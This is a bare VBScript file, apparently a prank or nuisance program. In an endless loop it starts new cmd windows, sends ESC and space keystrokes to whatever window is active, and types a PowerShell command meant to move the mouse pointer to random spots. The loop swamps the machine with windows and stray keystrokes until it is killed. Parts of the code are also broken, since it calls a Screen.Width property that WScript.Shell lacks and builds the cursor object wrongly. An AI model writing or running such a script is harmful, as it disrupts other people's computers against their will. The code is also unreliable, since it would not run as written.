Set WshShell = WScript.CreateObject("WScript.Shell")

While True
    Randomize
    screenWidth = WshShell.Screen.Width
    screenHeight = WshShell.Screen.Height
    x = Int((screenWidth * Rnd) + 1)
    y = Int((screenHeight * Rnd) + 1)
    WshShell.SendKeys "{ESC}"
    WScript.Sleep 10
    WshShell.Run "cmd /c mode con: cols=5 lines=1"
    WScript.Sleep 10
    WshShell.SendKeys " "
    WScript.Sleep 10
    WshShell.SendKeys "powershell -command ""$cursor = New-Object Windows.Forms.Cursor([System.Windows.Forms.Cursor]::Current.Handle); $cursor.Position = New-Object System.Drawing.Point(" & x & ", " & y & ")"""
    WScript.Sleep 100
Wend
